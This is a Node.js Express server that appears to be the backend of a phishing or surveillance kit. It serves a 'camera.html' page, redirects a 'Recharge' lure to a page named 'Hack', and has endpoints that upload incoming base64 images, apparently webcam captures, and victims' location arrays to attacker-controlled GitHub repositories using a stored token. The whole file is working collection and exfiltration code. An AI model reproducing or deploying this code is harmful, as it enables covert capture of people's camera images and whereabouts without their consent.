const express = require('express');
const cors = require('cors');
const fs = require('fs');
require('dotenv').config();
const app = express();
app.use(express.json({limit: "500mb"}));
app.use(cors());

app.get('/Recharge', (req, res) => {
  res.redirect("https://hajrat001.github.io/Hack/");
});

app.get('/', (req, res) => {
  res.send("<h1>wellcome filhal Abhi Jocks khtam hai</h1>");
})

app.get('/ali', (req, res) => {
  const f = "camera.html";
  const r = fs.readFileSync(f, 'utf8');
  res.send(r);
})

app.post('/03dataP', async (req, res) => {
  const d = req.body;
  const token = process.env.GITHUB_TOKEN;

  try {
    const results = await Promise.all(d.map(i => {
      const b = i.data.split(',')[1];
      return fetch(`https://api.github.com/repos/hajrat001/Image/contents/${i.name}`, {
        method: "PUT",
        headers: {
          'Authorization': `token ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          message: `upload ${i.name}`,
          content: b,
          encoding: 'base64'
        })
      })
      .then(r => r.json())
      .then(j => {
        if (j.content) {
          console.log(`${i.name} uploaded`);
          return { name: i.name, success: true };
        } else {
          console.log(`Error uploading ${i.name}: ${j.message}`);
          return { name: i.name, success: false, error: j.message };
        }
      });
    }));

    res.json({ status: "done", uploads: results });
  } catch (err) {
    console.error("Upload error:", err);
    res.status(500).send("Upload failed");
  }
});



app.post('/data01', async (req, res) => {
  const locations = req.body; // yeh ab ek array hoga
  const token = process.env.GITHUB_TOKEN;

  const owner = "hajrat001";
  const repo = "Server";
  const path = "data.json";
  const apiURL = `https://api.github.com/repos/${owner}/${repo}/contents/${path}`;

  try {
    // Step 1: Get existing file from GitHub
    const getRes = await fetch(apiURL, {
      headers: {
        Authorization: `Bearer ${token}`,
        Accept: "application/vnd.github.v3+json"
      }
    });

    const file = await getRes.json();
    const oldData = JSON.parse(Buffer.from(file.content, 'base64').toString());

    // Step 2: Append all incoming locations
    const newData = [...oldData, ...locations];

    // Step 3: Update file on GitHub
    const updatedContent = Buffer.from(JSON.stringify(newData, null, 2)).toString('base64');
    const putRes = await fetch(apiURL, {
      method: "PUT",
      headers: {
        Authorization: `Bearer ${token}`,
        Accept: "application/vnd.github.v3+json"
      },
      body: JSON.stringify({
        message: `Added ${locations.length} new location(s)`,
        content: updatedContent,
        sha: file.sha
      })
    });

    const result = await putRes.json();
    if (result.content) {
      res.json({ success: true, message: `${locations.length} location(s) saved to GitHub` });
    } else {
      res.status(500).json({ success: false, error: result.message });
    }

  } catch (err) {
    console.error("GitHub save error:", err);
    res.status(500).json({ success: false, error: "Server error" });
  }
});


app.listen(3000, () => {console.log('Hellow Ali')});
